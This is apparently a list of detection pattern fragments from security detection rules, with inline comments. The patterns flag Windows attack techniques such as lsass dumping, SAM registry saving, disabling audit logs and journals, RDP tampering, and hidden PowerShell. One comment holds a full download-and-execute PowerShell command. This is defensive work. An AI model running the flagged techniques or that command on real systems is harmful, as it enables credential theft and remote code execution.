CommandPatterns: -NoP '  # Often used in malicious PowerShell commands
-W Hidden '  # Often used in malicious PowerShell commands
-a' # No space after the flag because it accepts anything as long as there a "-a
-c ' # The ".exe" is not required to run the binary
-d ' # Shortest possible version of the --data flag
-me' # Shortest possible version of the -method flag
-ur' # Shortest possible version of the -uri flag
/mnt/c' # Path to mounted "C:\" partition (Indication of running Windows binaries via WSL)
SYSTEM ' # SYSTEM is a valid value for schtasks hence it gets it's own value with space
SYSTEM' # SYSTEM is a valid value for schtasks hence it gets it's own value with space
administrateur' # Typo without an 'S' so we catch both
administrator' # Typo without an 'S' so we catch both
fileanalysis' # Search specific files that can contains credentials and for regexes inside files
filesinfo' # Search generic files that can contains credentials
irm ' # Space before and after to avoid false positives with 'irm' as a substring
out ' # Export data from a table
queryout ' # Export data based on a SQL query
start '     # space character after the 'start' keyword indicates that a service name follows, in contrast to `net start` discovery expression
# Add more paths as they are discovered
# Add more permissions as you see fit in your environment
# Filter out legitimate locations if you find them
# These are the most common flags used with this tool. You could add other combinations if needed
# While looking at these files the prefix of their name will look something like csm.pdf, but in reality it is msc file
# make sure that your backend applies the strings case-insensitive
# need to improve this list, there are plenty of ASEP reg keys
#65560' # ordinal is 16 bit ordinal, so if you make the number large enough (don't fit in 16 bit space), then it normally wraps around.  for e.g ordinal 24 can be also represented by 65560 (65536+24)
--computername ' # Computer name that will be written to msDs-AllowedToActOnBehalfOfOtherIdentity
--set-' # Covers multiple edit commands such as "--set-resource-string" or "--set-version-string
--ur' # Shortest possible version of the --uri flag
-chp ' # relay to LDAP and change user password
-chpUser ' # the name of the user whose password you want to change
-cn ' # Computer name that will be written to msDs-AllowedToActOnBehalfOfOtherIdentity
-dse ' # write user defined value to the system DSE state flags; dse=0(disable),dse=1(enable)
-m 1M' # VM with just 1MB of ram is insufficient this is a suspicious flag
-map ' # map driver to the kernel and execute it entry point
-nographic' # This is also a key detection no one invoke without UI from console usually its a flag.
-ps ' #  modify process object of given ProcessID;
-rbcd ' # relay to LDAP and setup RBCD
.dmp full'  # Process dumping method apart from procdump
.githubusercontent.com'       # Includes both gists and github repositories / Michael Haag (idea)

/factory,{75dff2b7-6936-4c06-a8bb-676a7b00b24b}' # This will catch, the new explorer spawning which indicates a process/tree break. But you won't be able to catch the executing process. For that you need historical data
15AD&DEV_0740' # VMware VMCI PCI device (Vendor 0x15AD = VMware, Device 0x0740 = VMCI)
:3389' # RDP port and usual SSH tunneling related switches in command line
:[^ \\]'     # to avoid intersection with ADS rule
=1251' # ANSI Cyrillic; Cyrillic (Windows) - Observed ITW by Dharma ransomware
=866' # OEM Russian; Cyrillic (DOS) - Observed ITW by other malware
>>*set /p=' # To catch edge cases where the attacker passes it via a "cmd /c
Adobe Creative Cloud Experience\js' # Folder where Creative Cloud's JS resources are located
Avast Business Console Client Antivirus Service
Enabled' # Key used to disable specific provider of autologger session
EventLog-' # Cover multiple traces starting with EventLog-*
Get-ADIDNS' # Covers: Get-ADIDNSNodeAttribute, Get-ADIDNSNodeOwner, Get-ADIDNSNodeTombstoned, Get-ADIDNSPermission, Get-ADIDNSZone
LINK /' # Hardcoded command line when we call tools like dumpbin.exe, editbin.exe, lib.exe...etc
NT AUT' # This covers the usual NT AUTHORITY\SYSTEM
Remove-WindowsFeature' # Only supported in Windows Server 2008 R2 and Windows 2012 R2
Start' # Key used to disable specific autologger session like EventLog-Application, EventLog-System etc.
Usuarios de escritorio remoto' # Spanish for "Remote Desktop Users
Utilisateurs du Bureau Г  distance' # French for "Remote Desktop Users
VMWVMCIHOSTDEV' # VMware VMCI root host device driver name
Web Data' # Credit cards, autofill data
\AppData\Local\Temp\' # This could generate some FP with some installers creating folders with GUID
\Downloads\' # Could be source of FP depending on the environment
\SOFTWARE\Microsoft\Windows NT\CurrentVersion' # Provides details about the OS
\User Data\' # Most common folder for user profile data among Chromium browsers
\cmd/c'  # just cmd/c would be prone to false positives
\cmd/k'  # just cmd/k would be prone to false positives
\cmd/r'  # just cmd/r would be prone to false positives
\config\system '        # space needed to avoid false positives with \config\systemprofile\
\s-H\s' # Must be Regex as the flag needs to be case sensitive
add'     # to avoid intersection with discovery tactic rules
advfirewall firewall add rule name=Dropbox dir=in action=allow "program=?:\Program Files (x86)\Dropbox\Client\Dropbox.exe" enable=yes profile=Any
advfirewall firewall add rule name=Dropbox dir=in action=allow "program=?:\Program Files\Dropbox\Client\Dropbox.exe" enable=yes profile=Any
advfirewall firewall delete rule name="Avast Antivirus Admin Client
clear'   # delete or clears audit policy
copy lsass.exe_'  # procdump default pattern e.g. lsass.exe_220111_085234.dmp
createjournal'        # usn createjournal ==> can modify config to set it to a tiny size
currentVersion\run' # Also covers the strings "RunOnce", "RunOnceEx" and "runServicesOnce
deletejournal'        # usn deletejournal ==> generally ransomware or attacker
disable' # disables a specific audit policy
irm '  # powershell -ep bypass -w h -c irm test.domain/ffe | iex
lfn:'                # change log file location and name
move lsass.exe_'  # procdump default pattern e.g. lsass.exe_220111_085234.dmp
password123' # Also covers PASSWORD123123! as seen in https://www.microsoft.com/en-us/security/blog/2022/10/25/dev-0832-vice-society-opportunistic-ransomware-campaigns-impacting-us-education-sector/
process call create' # WMIC process creation
public static extern bool InstallELAMCertificateInfo(SafeFileHandle handle);
reg save '  # save registry SAM - syskey extraction
set-log '            # modifies config of specified log. could be uset to set it to a tiny size
setZeroData'          # file setZeroData  ==> empties a file with zeroes

ImagePatterns: # Add more folders to avoid FP
# as first is "Copy c:\windows\system32\stordiag.exe to a folder
.tmp' # sadly many installers use this extension
C:\Program Files\WindowsApps\Microsoft.WindowsTerminal' # We exclude the default path for WindowsTerminal
C:\Windows\System32\AppVClient.exe' # This parent is the expected process to launch "mavinject
C:\Windows\System32\cleanmgr.exe'  # Spawns DismHost.exe with a shortened username (if too long)
C:\Windows\system32\wevtutil.exe' # FP generated during installation of manifests via wevtutil
HotPotatoes ' # Covers the following: 'HotPotatoes 6', 'HotPotatoes 7', 'HotPotatoes Help', 'HotPotatoes Tutorial
\WebEx\WebexHost.exe' # Spawns a shortened version of the CLI and Image processes
\WmiPrvSE.exe' # In some legitimate case WmiPrvSE was seen spawning itself
\dfrgui.exe' # Was seen used by Lazarus Group - https://asec.ahnlab.com/en/39828/
\fsquirt.exe' # was seen used by sidewinder APT - https://securelist.com/sidewinder-apt/114089/
\net.exe' # "grant" Option available when used with "net share
\net1.exe' # "grant" Option available when used with "net share
\sftp.exe' # The "sftp.exe" located in the OpenSSH directory has no OriginalFileName :(
\takeown.exe' # If this generates FP in your environment. Comment it out or add more suspicious flags and locations
\wsmprovhost.exe' # Was seen used by Lazarus Group - https://asec.ahnlab.com/en/39828/
http' # captures both http and https
null # Race condition with some logging tools
python.exe' # no \ bc of e.g. ipython.exe

\Control\Terminal Server\InitialProgram' # This value can be set to specify a program to run automatically when a user logs on to a remote computer.
\Control\Terminal Server\WinStations\RDP-Tcp\InitialProgram' # This value can be set to specify a program to run automatically when a user logs on to a remote computer.
\DisableAttachementsInPV' # Turn off Protected View for attachments opened from Outlook
\DisableInternetFilesInPV' # Turn off Protected View for files downloaded from Internet zone
\DisableIntranetCheck' # Turn off Protected View for file located in UNC paths
\DisableRemoteDesktopAntiAlias' # Disable anti-aliasing for remote desktop (DarkGate malware)
\DisableSecuritySettings' # Disable security settings, allowing access to programs/entire desktop (DarkGate malware)
\DisableUnsafeLocationsInPV' # Turn off Protected View for unsafe locations
\Image File Execution Options' # Covered in better details in 36803969-5421-41ec-b92f-8500f79c23b0
\Outlook\Addins\DriveFSExtensionLib.Connect\' # An Outlook Add-in to talk with Google Drive
\Outlook\Addins\GoogleAppsSync.Connect\' # Google Apps Sync for Microsoft Outlook
\UserAuthentication' # Specifies that Network-Level user authentication is not required before the remote desktop connection is established
\Windows NT\Terminal Services\InitialProgram' # This value can be set to specify a program to run automatically when a user logs on to a remote computer.
\fDenyTSConnections' # Specifies whether Remote Desktop connections are enabled - When set to zero RDP is enabled
\fSingleSessionPerUser' # When changed to 0 it allows multiple RDP sessions
